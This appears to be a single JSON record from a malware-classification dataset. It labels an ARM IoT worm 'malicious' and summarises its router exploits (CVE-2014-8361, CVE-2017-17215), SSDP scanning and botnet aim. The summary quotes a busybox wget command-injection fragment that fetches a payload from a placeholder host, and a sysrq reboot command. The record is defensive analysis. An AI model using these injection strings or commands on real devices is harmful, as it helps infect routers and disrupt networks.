          "verdict": "malicious",
          "source": "palm",
          "analysis": "This is an ARM-based worm that targets IoT devices, primarily routers, to build a botnet. It contains multiple exploit payloads, including a command injection via UPnP's `NewStatusURL` parameter (`$(/bin/busybox wget -g %s -l /tmp/.oxy -`), related to CVE-2014-8361), and an exploit targeting Huawei Home Gateway devices via a crafted POST request to `/ctrlt/DeviceUpgrade_1` (CVE-2017-17215). The malware scans the local network for other vulnerable devices using SSDP M-SEARCH requests. It also includes functionality to force a device reboot (`echo b | sudo tee /proc/sysrq-trigger`).",
          "id": "c32ad2bea8f4daa31141bb87b52fc21b896b424ecacd082407d229d456c99df8-file-palm"
